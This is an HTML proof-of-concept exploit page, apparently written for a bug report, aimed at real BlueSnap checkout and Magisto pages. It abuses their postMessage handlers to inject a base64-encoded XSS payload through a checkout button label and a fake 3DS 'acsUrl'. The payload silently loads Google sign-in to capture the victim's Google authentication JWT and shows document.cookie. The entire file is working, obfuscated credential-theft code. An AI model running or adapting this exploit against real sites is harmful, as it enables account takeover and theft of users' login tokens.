<html>
  <body>
    <script>
      function x() {
        var atopoc = `\

top.opener.postMessage({stop:true},"*");
  const gsiScript = top.document.createElement('script');
  gsiScript.src = 'https://accounts.google.com/gsi/client';
  gsiScript.async = true;
  gsiScript.defer = true;

  top.window.handleCredentialResponse = (response) => {
    top.document.write('elMehdi PoC, User google Authentication JWT Has been stolen: ' + response.credential);
  };

  const gsiDiv = top.document.createElement('div');
  gsiDiv.id = 'g_id_onload';
  gsiDiv.setAttribute('data-client_id', '774247004952-e9enabia9n1d5m3o6hc8qp84v2ocjav1.apps.googleusercontent.com');
  gsiDiv.setAttribute('data-callback', 'handleCredentialResponse');
  gsiDiv.setAttribute('data-auto_select', 'true');

  top.document.head.appendChild(gsiScript);
  top.document.body.appendChild(gsiDiv);
  alert(document.cookie)


`;
        var exploit = `
var exprun,
  v = window.open("https://www.magisto.com/account/upgrade");
exprun = setInterval(function () {
  v.postMessage(
    JSON.stringify({
      tagId: "ccn",
      errorCode: "001",
      enrollmentData: {
        enrollmentStatus: "CHALLENGE_REQUIRED",
        acsUrl: "javascript:eval(atob('${btoa(atopoc)}'))",
        transactionId: "ddd",
        payload: "dddd",
      },
      errorDescription: "fff card number",
      event: "cardinalContinue",
    }),
    "*"
  );
}, 2000);
window.addEventListener("message", (event) => {
  if (event.data && event.data.stop) {
    clearInterval(exprun);
  }
});
        `;
        poc.contentWindow.postMessage(
          JSON.stringify({
            identifier: "embeddedCheckout",
            request: "setupCheckout",
            data: {
              title: "hey",
              description: "heyy",
              img: "x",
              includeEmail: true,
              buttonLabel:
                '"><img src=x onerror=eval(atob(`' + btoa(exploit) + "`))>",
              billingDetails: "ddd",
              "3DS": "dddd",
              shopperData: {
                address: "ddd",
                city: "lolfff",
                country: "DZ",
                email: "dd@ffvvvv.fr",
                firstname: "ahxxvvvv",
                lastname: "ppvvvv",
                state: "californiavv",
                zip: 2000,
              },
            },
          }),
          "*"
        );

        setTimeout(() => {
          poc.contentWindow.postMessage(
            JSON.stringify({
              identifier: "embeddedCheckout",
              request: "openCheckout",
            }),
            "*"
          );
        }, 1000);
      }
    </script>
    <iframe
      src="https://www2.bluesnap.com/web-sdk/4.12.12/embeddedCheckout.html"
      name="aHR0cHM6Ly92LjB4ei5vcmc="
      id="poc"
      onload="x()"
      height="100%"
      width="100%"
    ></iframe>

    <!--aHR0cHM6Ly92LjB4ei5vcmc= is https://v.0xz.org in base64 and it's necessary-->
  </body>
</html>
